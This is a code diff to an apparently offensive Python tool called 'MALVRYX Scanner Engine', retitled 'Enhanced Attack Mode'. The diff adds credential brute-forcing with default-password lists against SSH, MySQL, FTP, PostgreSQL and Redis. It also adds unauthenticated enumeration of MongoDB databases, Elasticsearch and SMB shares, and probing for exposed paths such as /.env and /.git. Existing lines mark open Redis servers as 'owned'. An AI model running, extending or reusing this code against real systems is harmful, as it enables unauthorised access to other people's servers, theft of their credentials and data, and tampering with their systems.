@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-MALVRYX Scanner Engine
+MALVRYX Scanner Engine - Enhanced Attack Mode
 """
 import socket, ssl, threading, time, json, requests, sys, os, ipaddress
 from concurrent.futures import ThreadPoolExecutor, as_completed
@@ -161,11 +161,15 @@ class Scanner:
     def _try_attack(self, ip: str, port: int, service: str) -> Dict:
         attacks = {}
         
+        # ===== SSH =====
         if port == 22:
             try:
                 import paramiko
-                for user in ['root','admin','ubuntu','test']:
-                    for passwd in ['password','123456','admin','root','toor']:
+                users = ['root', 'admin', 'ubuntu', 'test', 'user', 'pi', 'debian', 'ftpuser']
+                passwords = ['password', '123456', 'admin', 'root', 'toor', '12345', '12345678', 
+                             'qwerty', 'abc123', 'password123', 'admin123', 'root123', 'pass123']
+                for user in users:
+                    for passwd in passwords:
                         try:
                             ssh = paramiko.SSHClient()
                             ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -178,13 +182,15 @@ class Scanner:
             except:
                 pass
         
+        # ===== MySQL =====
         if port == 3306:
             try:
                 import mysql.connector
-                for passwd in ['','root','password','123456']:
+                passwords = ['', 'root', 'password', '123456', 'admin', 'mysql', 'password123']
+                for passwd in passwords:
                     try:
                         conn = mysql.connector.connect(host=ip, port=3306, user='root', password=passwd, timeout=3)
-                        attacks['mysql'] = f"root:{passwd}"
+                        attacks['mysql'] = f"root:{passwd if passwd else '(empty)'}"
                         conn.close()
                         return attacks
                     except:
@@ -192,6 +198,7 @@ class Scanner:
             except:
                 pass
         
+        # ===== Redis =====
         if port == 6379:
             try:
                 import redis
@@ -199,13 +206,146 @@ class Scanner:
                 if r.ping():
                     attacks['redis'] = 'Unauthenticated - VULNERABLE'
                     r.set('malvryx', 'owned')
+                    attacks['redis_info'] = r.info()
+                else:
+                    for passwd in ['', 'password', '123456', 'admin', 'redis']:
+                        try:
+                            r = redis.Redis(host=ip, port=6379, password=passwd, socket_timeout=3)
+                            if r.ping():
+                                attacks['redis'] = f'Password found: {passwd}'
+                                break
+                        except:
+                            continue
+            except:
+                pass
+        
+        # ===== FTP =====
+        if port == 21:
+            try:
+                import ftplib
+                ftp = ftplib.FTP(ip)
+                ftp.login('anonymous', 'anonymous')
+                attacks['ftp'] = 'Anonymous login allowed'
+                ftp.quit()
+            except:
+                users = ['admin', 'ftp', 'user', 'test', 'anonymous']
+                passwords = ['', 'password', '123456', 'admin', 'ftp', 'pass']
+                for user in users:
+                    for passwd in passwords:
+                        try:
+                            ftp = ftplib.FTP(ip)
+                            ftp.login(user, passwd)
+                            attacks['ftp'] = f"{user}:{passwd if passwd else '(empty)'}"
+                            ftp.quit()
+                            return attacks
+                        except:
+                            continue
+            except:
+                pass
+        
+        # ===== PostgreSQL =====
+        if port == 5432:
+            try:
+                import psycopg2
+                for passwd in ['', 'postgres', 'password', '123456']:
+                    try:
+                        conn = psycopg2.connect(host=ip, port=5432, user='postgres', password=passwd, connect_timeout=3)
+                        attacks['postgres'] = f"postgres:{passwd if passwd else '(empty)'}"
+                        conn.close()
+                        return attacks
+                    except:
+                        continue
+            except:
+                pass
+        
+        # ===== MongoDB =====
+        if port == 27017:
+            try:
+                from pymongo import MongoClient
+                client = MongoClient(ip, 27017, serverSelectionTimeoutMS=3000)
+                client.server_info()
+                attacks['mongodb'] = 'Unauthenticated - VULNERABLE'
+                dbs = client.list_database_names()
+                attacks['mongodb_dbs'] = dbs[:5]
+            except:
+                pass
+        
+        # ===== Elasticsearch =====
+        if port == 9200:
+            try:
+                import requests
+                resp = requests.get(f"http://{ip}:9200/", timeout=3)
+                if resp.status_code == 200:
+                    attacks['elasticsearch'] = 'Open - Data accessible'
+                    if 'version' in resp.text:
+                        attacks['elasticsearch_version'] = resp.text[:200]
+            except:
+                pass
+        
+        # ===== HTTP/HTTPS =====
+        if port in [80, 443, 8080, 8443]:
+            try:
+                import requests
+                protocol = 'https' if port in [443, 8443] else 'http'
+                url = f"{protocol}://{ip}:{port}"
+                
+                paths = ['/admin', '/login', '/wp-admin', '/cpanel', '/phpmyadmin', '/dashboard',
+                         '/administrator', '/user', '/console', '/api', '/v1', '/dev', '/test',
+                         '/backup', '/config', '/.git', '/.env', '/.htaccess', '/wp-login.php',
+                         '/admin/login', '/adminpanel', '/cp', '/control', '/management']
+                
+                found_paths = []
+                for path in paths:
+                    try:
+                        resp = requests.get(f"{url}{path}", timeout=3, verify=False)
+                        if resp.status_code in [200, 301, 302, 403]:
+                            found_paths.append(path)
+                    except:
+                        continue
+                
+                if found_paths:
+                    attacks['web'] = f"Paths found: {', '.join(found_paths[:5])}"
+                
+                for path in ['/images', '/uploads', '/files', '/documents', '/data']:
+                    try:
+                        resp = requests.get(f"{url}{path}", timeout=3, verify=False)
+                        if 'Index of' in resp.text or 'Directory listing' in resp.text:
+                            attacks['web_dir_listing'] = f"Directory listing: {path}"
+                            break
+                    except:
+                        continue
+            except:
+                pass
+        
+        # ===== SMB =====
+        if port == 445:
+            try:
+                import smbclient
+                try:
+                    shares = smbclient.list_shares(ip, username='guest', password='')
+                    if shares:
+                        attacks['smb'] = f"Shares: {shares}"
+                except:
+                    pass
+            except:
+                pass
+        
+        # ===== RDP =====
+        if port == 3389:
+            try:
+                import socket
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(3)
+                sock.connect((ip, 3389))
+                banner = sock.recv(1024)
+                attacks['rdp'] = f"RDP Banner: {banner[:50].decode('utf-8', errors='ignore')}"
+                sock.close()
             except:
                 pass
         
         return attacks
     
     def scan(self, target: str) -> List[Dict]:
-        # Resolve domain to IP
         if not self._is_ip(target):
             resolved = self.bypass.resolve_dns(target)
             if resolved:
